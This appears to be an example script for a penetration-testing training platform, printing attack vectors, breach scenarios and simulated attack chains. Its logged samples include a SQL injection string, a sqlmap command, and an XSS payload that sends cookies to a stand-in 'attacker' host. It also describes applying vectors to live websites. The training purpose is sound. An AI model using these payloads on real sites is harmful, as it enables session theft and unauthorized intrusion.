"""
Example: How Attack Vectors and Simulations Work Together
Shows practical code integration patterns
"""

from attack_vectors_engine import (
    AttackVectorEngine, AttackPhase, VulnerabilityType
)
from realistic_simulations import (
    RealisticSimulationEngine, AICoachingEngine, WebTargetScanner
)


def example_1_understanding_vectors():
    """Learn about individual attack vectors"""
    print("=" * 60)
    print("EXAMPLE 1: Understanding Attack Vectors")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    
    # Get a specific vector
    sql_vector = engine.get_vector('sql_injection')
    print(f"\n📌 Attack Vector: {sql_vector.name}")
    print(f"   Description: {sql_vector.description}")
    print(f"   Vulnerability Type: {sql_vector.vuln_type.value}")
    print(f"   Attack Phase: {sql_vector.phase.value}")
    print(f"   Difficulty: {sql_vector.difficulty}")
    print(f"\n   Available Tools:")
    for tool in sql_vector.tools:
        print(f"     • {tool}")
    print(f"\n   Sample Payloads:")
    for payload in sql_vector.payloads:
        print(f"     • {payload}")
    print(f"\n   Detection Methods:")
    for signal in sql_vector.detection_signals:
        print(f"     • {signal}")
    print(f"\n   How to Defend:")
    for mitigation in sql_vector.mitigation:
        print(f"     • {mitigation}")


def example_2_threat_scenario():
    """See how vectors combine into threat scenarios"""
    print("\n" + "=" * 60)
    print("EXAMPLE 2: Threat Scenario with Attack Chain")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    
    # Get a scenario
    scenario = engine.get_scenario('ecommerce_breach')
    print(f"\n🎯 Scenario: {scenario.name}")
    print(f"   Description: {scenario.description}")
    print(f"   Severity: {scenario.severity}")
    print(f"   Target: {scenario.target_type}")
    print(f"   Time: {scenario.estimated_time} minutes")
    print(f"   Difficulty: {scenario.difficulty}")
    
    print(f"\n📋 Attack Chain (Sequential Steps):")
    chain = engine.get_scenario_chain(scenario.scenario_id)
    for step in chain:
        phase = step['phase']
        vector = step['vector']
        seq = step['sequence_step']
        print(f"\n   Step {seq}: [{phase}] {vector['name']}")
        print(f"   - Tools: {', '.join(vector['tools'])}")
        print(f"   - Example: {vector['payloads'][0] if vector['payloads'] else 'N/A'}")
    
    print(f"\n✅ Success Criteria:")
    for i, criteria in enumerate(scenario.success_criteria, 1):
        print(f"   {i}. {criteria}")


def example_3_vector_discovery():
    """Find vectors by filtering"""
    print("\n" + "=" * 60)
    print("EXAMPLE 3: Discovering Vectors by Filter")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    
    # Find all injection vectors
    print(f"\n🔍 All INJECTION vulnerabilities:")
    injection_vectors = engine.find_vectors_by_vuln_type(VulnerabilityType.INJECTION)
    for vector in injection_vectors:
        print(f"   • {vector.name} ({vector.difficulty})")
    
    # Find all exploitation phase vectors
    print(f"\n🔍 All EXPLOITATION phase vectors:")
    exploit_vectors = engine.find_vectors_by_phase(AttackPhase.EXPLOITATION)
    for vector in exploit_vectors:
        print(f"   • {vector.name} ({vector.difficulty})")
    
    # Find hard vectors
    print(f"\n🔍 All HARD difficulty vectors:")
    hard_vectors = engine.find_vectors_by_difficulty('Hard')
    for vector in hard_vectors:
        print(f"   • {vector.name} ({vector.phase.value})")


def example_4_scenario_vectors():
    """See all vectors in a scenario"""
    print("\n" + "=" * 60)
    print("EXAMPLE 4: Vectors Used in a Scenario")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    
    scenario = engine.get_scenario('ecommerce_breach')
    vectors = engine.get_scenario_vectors(scenario.scenario_id)
    
    print(f"\n📚 Vectors in '{scenario.name}':")
    for vector in vectors:
        print(f"\n   {vector.name}")
        print(f"   ├─ Type: {vector.vuln_type.value}")
        print(f"   ├─ Phase: {vector.phase.value}")
        print(f"   ├─ Difficulty: {vector.difficulty}")
        print(f"   └─ CVEs: {', '.join(vector.cve_refs)}")


def example_5_related_scenarios():
    """Find which scenarios use a specific vector"""
    print("\n" + "=" * 60)
    print("EXAMPLE 5: Scenarios Using a Specific Vector")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    
    print(f"\n🎯 Scenarios that use SQL INJECTION:")
    scenarios = engine.get_related_scenarios('sql_injection')
    for scenario in scenarios:
        print(f"   • {scenario.name} ({scenario.severity}, {scenario.difficulty})")
        print(f"     - Time: {scenario.estimated_time} minutes")
        print(f"     - Vectors: {len(scenario.attack_vectors)} vectors used")


def example_6_learning_path():
    """Generate progressive learning paths"""
    print("\n" + "=" * 60)
    print("EXAMPLE 6: Progressive Learning Paths")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    
    for difficulty in ['Easy', 'Medium', 'Hard']:
        print(f"\n📚 {difficulty.upper()} LEARNING PATH:")
        path = engine.get_learning_path(difficulty)
        
        for item in path:
            scenario = item['scenario']
            vectors = item['vectors']
            step = item['progression']
            
            print(f"\n   Step {step}: {scenario['name']}")
            print(f"   Time: {scenario['estimated_time']} min | Vectors: {len(vectors)}")
            for vector in vectors:
                print(f"     • {vector['name']} ({vector['difficulty']})")


def example_7_simulation_with_vectors():
    """How simulations use the attack vector engine"""
    print("\n" + "=" * 60)
    print("EXAMPLE 7: Simulations with Attack Vectors")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    sim_engine = RealisticSimulationEngine()
    
    # Simulate an attack in the ecommerce scenario
    scenario_id = 'ecommerce_breach'
    scenario = engine.get_scenario(scenario_id)
    
    print(f"\n🎮 Running Scenario Simulation: {scenario.name}")
    print(f"   Target: {scenario.target_type}")
    print(f"   Time: {scenario.estimated_time} minutes")
    
    # Simulate attack chain
    print(f"\n📝 Simulated Attack Execution:")
    
    # Step 1: SQL Injection
    print(f"\n   [Step 1] Execute SQL Injection")
    command = "sqlmap -u http://target/login --dbs"
    response = sim_engine.get_response(scenario_id, command)
    print(f"   Command: {command}")
    print(f"   Response (first 200 chars): {response[:200]}...")
    
    # Step 2: XSS
    print(f"\n   [Step 2] Execute XSS Attack")
    command = "alert(document.cookie)"
    response = sim_engine.get_response(scenario_id, command)
    print(f"   Command: {command}")
    print(f"   Response: {response[:100]}...")
    
    # Get coaching
    coaching = AICoachingEngine.get_coaching(scenario_id, attempt_number=0)
    print(f"\n   🤖 AI Coaching: {coaching}")


def example_8_live_target_with_vectors():
    """Apply vectors to live targets"""
    print("\n" + "=" * 60)
    print("EXAMPLE 8: Live Target Analysis with Vectors")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    sim_engine = RealisticSimulationEngine()
    
    # Analyze a live target
    target = "http://example.com"
    
    print(f"\n🌐 Analyzing Live Target: {target}")
    print(f"   Using Attack Vector methodology...")
    
    # Phase 1: Reconnaissance (via URL fetching)
    print(f"\n   [Reconnaissance Phase]")
    response = sim_engine.get_response(
        scenario_id=None,
        command="curl http://example.com",
        use_live_data=True,
        target_url=target
    )
    print(f"   Command: curl {target}")
    print(f"   Result: Fetched {len(response)} bytes")
    
    # Phase 2: Enumeration (forms)
    print(f"\n   [Exploitation Phase - Form Analysis]")
    sql_vector = engine.get_vector('sql_injection')
    print(f"   Looking for: {sql_vector.name}")
    print(f"   Tools to use: {', '.join(sql_vector.tools)}")
    
    response = sim_engine.get_response(
        scenario_id=None,
        command="form http://example.com",
        use_live_data=True,
        target_url=target
    )
    print(f"   Forms discovered: {response[:150]}...")


def example_9_execution_logging():
    """Log attack attempts for learning"""
    print("\n" + "=" * 60)
    print("EXAMPLE 9: Execution Logging for Training")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    
    # Log a successful SQL injection
    print(f"\n📊 Logging Attack Execution:")
    
    engine.log_execution(
        scenario_id='ecommerce_breach',
        vector_id='sql_injection',
        success=True,
        payload="' OR '1'='1",
        result="Database accessed, 500 user records extracted"
    )
    
    print(f"   ✅ Logged: SQL Injection attack")
    print(f"   Scenario: ecommerce_breach")
    print(f"   Result: Success")
    
    engine.log_execution(
        scenario_id='ecommerce_breach',
        vector_id='xss_reflected',
        success=True,
        payload="<script>fetch('http://attacker/c=' + document.cookie)</script>",
        result="Admin session cookie stolen"
    )
    
    print(f"\n   ✅ Logged: XSS attack")
    print(f"   Scenario: ecommerce_breach")
    print(f"   Result: Success - Cookie exfiltration")
    
    print(f"\n📈 Total Logged Attacks: {len(engine.execution_log)}")


def example_10_export_catalog():
    """Export catalog for sharing"""
    print("\n" + "=" * 60)
    print("EXAMPLE 10: Export Catalog")
    print("=" * 60)
    
    engine = AttackVectorEngine()
    
    catalog = engine.export_catalog()
    
    print(f"\n💾 Exported Catalog:")
    print(f"   Vectors: {len(catalog['vectors'])} items")
    print(f"   Scenarios: {len(catalog['scenarios'])} items")
    print(f"   Exported at: {catalog['exported_at']}")
    print(f"   Size: {len(str(catalog))} bytes")
    
    # Show structure
    print(f"\n   Vector example (first):")
    first_vector = list(catalog['vectors'].values())[0]
    print(f"     Name: {first_vector['name']}")
    print(f"     Type: {first_vector['vuln_type']}")
    print(f"     Phase: {first_vector['phase']}")


# Run all examples
if __name__ == "__main__":
    example_1_understanding_vectors()
    example_2_threat_scenario()
    example_3_vector_discovery()
    example_4_scenario_vectors()
    example_5_related_scenarios()
    example_6_learning_path()
    example_7_simulation_with_vectors()
    example_8_live_target_with_vectors()
    example_9_execution_logging()
    example_10_export_catalog()
    
    print("\n" + "=" * 60)
    print("✅ All Examples Complete")
    print("=" * 60)
    print("\nKey Takeaways:")
    print("  1. Attack vectors are individual techniques (SQL injection, XSS, etc.)")
    print("  2. Threat scenarios combine multiple vectors in attack chains")
    print("  3. Simulations let you practice both scenario and vector-based attacks")
    print("  4. Live targets apply vectors to real websites")
    print("  5. Learning paths guide progression from easy to expert")
